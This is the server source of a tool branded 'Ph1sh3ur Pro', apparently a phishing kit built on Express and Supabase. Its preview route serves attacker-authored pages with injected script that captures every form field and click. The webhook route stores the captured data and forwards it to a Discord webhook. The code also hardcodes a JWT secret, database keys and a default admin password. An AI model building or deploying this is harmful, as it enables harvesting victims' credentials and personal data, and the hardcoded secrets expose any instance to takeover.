import "dotenv/config";
import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import cookieParser from "cookie-parser";
import { createClient } from "@supabase/supabase-js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const JWT_SECRET = process.env.JWT_SECRET || "ph1sh3ur-secret-key-2026";
const SUPABASE_URL = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || process.env.PUBLIC_SUPABASE_URL || "https://oxyrlpiknlsytygrdydh.supabase.co";
const SUPABASE_KEY = process.env.SUPABASE_KEY || process.env.VITE_SUPABASE_KEY || process.env.PUBLIC_SUPABASE_KEY || "sb_publishable_MN_NO7gG2KqvSDrQlG9zog_2e2CK2ZT";

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const app = express();

app.use(express.json());
app.use(cookieParser());

// Auth Middleware
const authenticate = (req: any, res: any, next: any) => {
  const token = req.cookies.token;
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: "Invalid token" });
  }
};

// Diagnostic & Setup Route
app.get("/api/setup", async (req, res) => {
  const results: any = {
    supabase_url: SUPABASE_URL ? "Configured" : "Missing",
    supabase_key: SUPABASE_KEY ? (SUPABASE_KEY.startsWith('ey') ? "Service Role (Correct)" : "Anon Key (Incorrect)") : "Missing",
    tables: {}
  };

  try {
    // Test users table
    const { error: userError } = await supabase.from('users').select('count', { count: 'exact', head: true });
    results.tables.users = userError ? `Error: ${userError.message}` : "OK";

    // Force create admin if OK
    if (!userError) {
      const { data: adminUser } = await supabase.from('users').select('*').eq('username', 'admin').single();
      if (!adminUser) {
        const hashedPassword = bcrypt.hashSync("Ph1sh3ur-Pro-2026", 10);
        const { error: insertError } = await supabase.from('users').insert([{ username: 'admin', password: hashedPassword, role: 'admin' }]);
        results.admin_creation = insertError ? `Failed: ${insertError.message}` : "Success (admin / Ph1sh3ur-Pro-2026)";
      } else {
        results.admin_creation = "Already exists";
      }
    }
  } catch (err: any) {
    results.error = err.message;
  }

  res.json(results);
});

// Auth Routes
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  console.log(`Login attempt for user: ${username}`);
  
  try {
    const { data: user, error } = await supabase.from('users').select('*').eq('username', username).single();
    
    if (error) {
      console.error("Supabase error during login:", error);
      return res.status(401).json({ error: "User not found or database error" });
    }

    if (!user || !bcrypt.compareSync(password, user.password)) {
      console.warn(`Invalid credentials for user: ${username}`);
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: "24h" });
    res.cookie("token", token, { httpOnly: true, secure: true, sameSite: 'none', maxAge: 24 * 60 * 60 * 1000 });
    console.log(`Login successful for user: ${username}`);
    res.json({ id: user.id, username: user.username, role: user.role });
  } catch (err) {
    console.error("Unexpected error during login:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/logout", (req, res) => {
  res.clearCookie("token");
  res.json({ success: true });
});

app.get("/api/me", (req, res) => {
  const token = req.cookies.token;
  if (!token) return res.status(401).json({ error: "Not logged in" });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    res.json(decoded);
  } catch (err) {
    res.status(401).json({ error: "Invalid token" });
  }
});

// User Management
app.get("/api/users", authenticate, async (req: any, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
  const { data: users } = await supabase.from('users').select('id, username, role, created_at');
  res.json(users || []);
});

app.post("/api/users", authenticate, async (req: any, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
  const { username, password, role } = req.body;
  const hashedPassword = bcrypt.hashSync(password, 10);
  const { error } = await supabase.from('users').insert([{ username, password: hashedPassword, role: role || 'user' }]);
  if (error) return res.status(400).json({ error: "Username already exists or error" });
  res.json({ success: true });
});

app.delete("/api/users/:id", authenticate, async (req: any, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
  if (parseInt(req.params.id) === req.user.id) return res.status(400).json({ error: "Cannot delete yourself" });
  await supabase.from('users').delete().eq('id', req.params.id);
  res.json({ success: true });
});

// API Routes
app.get("/api/pages", authenticate, async (req, res) => {
  const { data: pages } = await supabase.from('pages').select('*').order('created_at', { ascending: false });
  res.json(pages || []);
});

app.post("/api/pages", authenticate, async (req, res) => {
  const { id, title, button_text, content, webhook_enabled } = req.body;
  const { error } = await supabase.from('pages').upsert({ 
    id, title, button_text, content, 
    webhook_enabled: webhook_enabled ? true : false,
    updated_at: new Date().toISOString()
  });
  if (error) return res.status(400).json({ error: error.message });
  res.json({ success: true });
});

app.delete("/api/pages/:id", authenticate, async (req, res) => {
  await supabase.from('pages').delete().eq('id', req.params.id);
  res.json({ success: true });
});

app.get("/api/logs", authenticate, async (req, res) => {
  const { data: logs } = await supabase.from('logs').select('*').order('timestamp', { ascending: false }).limit(100);
  res.json(logs || []);
});

app.delete("/api/logs", authenticate, async (req, res) => {
  await supabase.from('logs').delete().neq('id', 0); // Delete all
  res.json({ success: true });
});

app.delete("/api/logs/:id", authenticate, async (req, res) => {
  await supabase.from('logs').delete().eq('id', req.params.id);
  res.json({ success: true });
});

app.post("/api/webhook/:pageId", async (req, res) => {
  const { pageId } = req.params;
  const data = JSON.stringify(req.body);
  console.log(`Webhook received for page ${pageId}:`, req.body);
  
  const { data: page } = await supabase.from('pages').select('webhook_enabled').eq('id', pageId).single();
  if (!page || !page.webhook_enabled) {
    return res.json({ success: false, message: "Webhook disabled for this page" });
  }

  if (req.body._hp_field) {
    return res.json({ success: true, bot: true });
  }

  await supabase.from('logs').insert([{ page_id: pageId, event_type: "interaction", data }]);

  const { data: discordWebhook } = await supabase.from('settings').select('value').eq('key', 'discord_webhook').single();
  if (discordWebhook?.value) {
    try {
      const eventType = req.body._event_type || 'interaction';
      const cleanData = { ...req.body };
      delete cleanData._event_type;
      delete cleanData._timestamp;
      delete cleanData._url;

      await fetch(discordWebhook.value, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: `🚀 Ph1sh3ur Alert: ${eventType === 'form_submission' ? 'Form Submitted' : 'Button Clicked'}`,
            description: `New activity on page: **${pageId}**`,
            color: eventType === 'form_submission' ? 0x10b981 : 0x3b82f6,
            fields: [
              {
                name: "Data Received",
                value: `\`\`\`json\n${JSON.stringify(cleanData, null, 2).substring(0, 1000)}\n\`\`\``
              },
              {
                name: "Source URL",
                value: req.body._url || 'Unknown'
              }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
    } catch (err) {
      console.error("Discord webhook failed", err);
    }
  }

  res.json({ success: true });
});

app.post("/api/webhook/test", authenticate, async (req, res) => {
  const { data: discordWebhook } = await supabase.from('settings').select('value').eq('key', 'discord_webhook').single();
  if (discordWebhook?.value) {
    try {
      await fetch(discordWebhook.value, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `✅ **Ph1sh3ur Test**: Your Discord webhook is properly configured!`,
          embeds: [{
            title: "Ph1sh3ur System Check",
            description: "This is a test notification to confirm your integration is working.",
            color: 0x10b981,
            timestamp: new Date().toISOString()
          }]
        })
      });
      return res.json({ success: true });
    } catch (err) {
      return res.status(500).json({ success: false, error: "Failed to send to Discord" });
    }
  }
  res.status(400).json({ success: false, error: "No webhook configured" });
});

app.get("/api/settings", authenticate, async (req, res) => {
  const { data: settings } = await supabase.from('settings').select('*');
  const settingsObj = (settings || []).reduce((acc: any, curr: any) => {
    acc[curr.key] = curr.value;
    return acc;
  }, {});
  res.json(settingsObj);
});

app.post("/api/settings", authenticate, async (req, res) => {
  const { discord_webhook, logo_url } = req.body;
  if (discord_webhook !== undefined) {
    await supabase.from('settings').upsert({ key: "discord_webhook", value: discord_webhook });
  }
  if (logo_url !== undefined) {
    await supabase.from('settings').upsert({ key: "logo_url", value: logo_url });
  }
  res.json({ success: true });
});

app.get("/preview/:id", async (req, res) => {
  try {
    const { data: page } = await supabase.from('pages').select('*').eq('id', req.params.id).single();
    if (!page) return res.status(404).send("Page not found");

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${page.title}</title>
        <style>
          body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
          .hp-field { display: none !important; visibility: hidden !important; }
          #action-button { cursor: pointer; }
        </style>
      </head>
      <body>
        ${page.content}
        <script>
          document.addEventListener('DOMContentLoaded', () => {
            const pageId = "${page.id}";
            
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
              if (!form.querySelector('input[name="_hp_field"]')) {
                const hp = document.createElement('input');
                hp.type = 'text';
                hp.name = '_hp_field';
                hp.className = 'hp-field';
                form.appendChild(hp);
              }

              form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const data = {};
                const inputs = form.querySelectorAll('input, textarea, select');
                inputs.forEach(input => {
                  if (input.name === '_hp_field') return;
                  const key = input.name || input.id || 'field_' + Math.random().toString(36).substr(2, 4);
                  data[key] = input.value;
                });
                
                await fetch('/api/webhook/' + pageId, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ ...data, _event_type: 'form_submission', _url: window.location.href })
                });
                
                const btn = form.querySelector('button[type="submit"]');
                if (btn) btn.innerText = "Success!";
                setTimeout(() => { window.location.reload(); }, 2000);
              });
            });

            document.addEventListener('click', async (e) => {
              const target = e.target.closest('button, a.btn, .button, #action-button');
              if (!target || (target.type === 'submit' && target.closest('form'))) return;
              
              await fetch('/api/webhook/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  text: target.innerText, 
                  _event_type: 'click', 
                  _url: window.location.href 
                })
              });
            });
          });
        </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    res.status(500).send("Server error");
  }
});

// Static files and SPA fallback
if (process.env.NODE_ENV === "production" || process.env.VERCEL) {
  const clientPath = path.join(process.cwd(), "dist", "client");
  app.use(express.static(clientPath));
  
  app.get("/*", (req, res, next) => {
    const url = req.url.split('?')[0];
    if (url.startsWith('/api') || url.startsWith('/preview')) {
      return next();
    }
    res.sendFile(path.join(clientPath, "index.html"));
  });
}

async function startServer() {
  const PORT = Number(process.env.PORT) || 3000;

  // Initialize Admin User if not exists
  try {
    const { data: adminUser } = await supabase.from('users').select('*').eq('username', 'admin').single();
    if (!adminUser) {
      const hashedPassword = bcrypt.hashSync("Ph1sh3ur-Pro-2026", 10);
      await supabase.from('users').insert([{ username: 'admin', password: hashedPassword, role: 'admin' }]);
      console.log("Default admin user created in Supabase: admin / Ph1sh3ur-Pro-2026");
    }
  } catch (err) {
    console.error("Failed to initialize admin user:", err);
  }

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom",
    });
    app.use(vite.middlewares);
    
    app.get("/*", async (req, res, next) => {
      const url = req.url.split('?')[0];
      if (url.startsWith('/api') || url.startsWith('/preview')) {
        return next();
      }
      try {
        const html = await vite.transformIndexHtml(req.url, `
          <!doctype html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Ph1sh3ur Pro</title>
            </head>
            <body>
              <div id="root"></div>
              <script type="module" src="/src/main.tsx"></script>
            </body>
          </html>
        `);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(html);
      } catch (e) {
        vite.ssrFixStacktrace(e as Error);
        next(e);
      }
    });
  }

  // Only listen if not in serverless environment
  if (process.env.NODE_ENV !== "production" || !process.env.VERCEL) {
    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  }
}

startServer();

export default app;
